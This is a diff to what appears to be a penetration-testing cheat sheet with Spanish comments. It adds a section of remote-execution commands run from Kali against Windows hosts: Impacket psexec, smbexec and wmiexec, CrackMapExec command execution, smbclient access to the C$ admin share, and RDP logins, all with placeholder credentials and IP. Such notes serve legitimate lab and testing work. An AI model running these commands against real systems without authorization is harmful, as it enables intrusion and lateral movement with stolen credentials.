@@ -66,4 +66,16 @@ RUNAS (Interactive)
 -----------------------------------
 runas /netonly /user:domain\user "cmd.exe"
     pass
-+ las que tienes desde kali ( si soy de kali lo siento)
+
+REMOTO DESDE KALI
+-------------------------
+psexec.py user:pass@10.10.10.10
+smbexec.py user:pass@10.10.10.10
+wmiexec.py user:pass@10.10.10.10
+CrackMapExec.py 10.10.10.10 -d domain -u user -p pass -x cmd
+
+smbclient -U "Administrator" \\\\10.10.10.10\\C$
+smbclient \\\\10.10.10.10\\Users -U user pass
+
+rdp_check.py domain\user:pass@10.10.10.10
+rdesktop -d domain -u user -p pass 10.10.10.10
